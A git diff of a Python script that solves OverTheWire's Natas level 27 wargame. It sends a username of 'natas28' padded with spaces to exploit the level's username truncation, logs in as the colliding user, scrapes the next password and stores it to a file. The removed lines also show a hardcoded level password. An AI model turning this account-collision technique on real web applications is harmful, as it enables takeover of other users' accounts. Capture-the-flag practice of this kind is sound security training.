@@ -11,10 +11,12 @@ def writeResponse(enumerate = ''):
     with open(f'./response{enumerate}.html', 'w') as browserFile:
         browserFile.write(soup.prettify())
 
-lvl_name = 'natas27'
-url = f'http://{lvl_name}.natas.labs.overthewire.org'
+lvl = '27'
+next_level = str(int(lvl)+1)
+pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
+url = f'http://natas{lvl}.natas.labs.overthewire.org'
+lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
 
-lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3')
 my_cookies = {}
 username = 'natas28' + ' '*57
 my_params = {'username':f'{username}X','password':'my_password'}
@@ -22,9 +24,10 @@ make()
 my_params['username'] = username
 
 res, soup = make()
-print(re.search(r"[a-zA-Z0-9]{32}$", soup.find("div",id="content").text, re.MULTILINE)[0])
+pw = (re.search(r"[a-zA-Z0-9]{32}$", soup.find("div",id="content").text, re.MULTILINE)[0])
 
-writeResponse()
+open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)
+
 
 '''
 
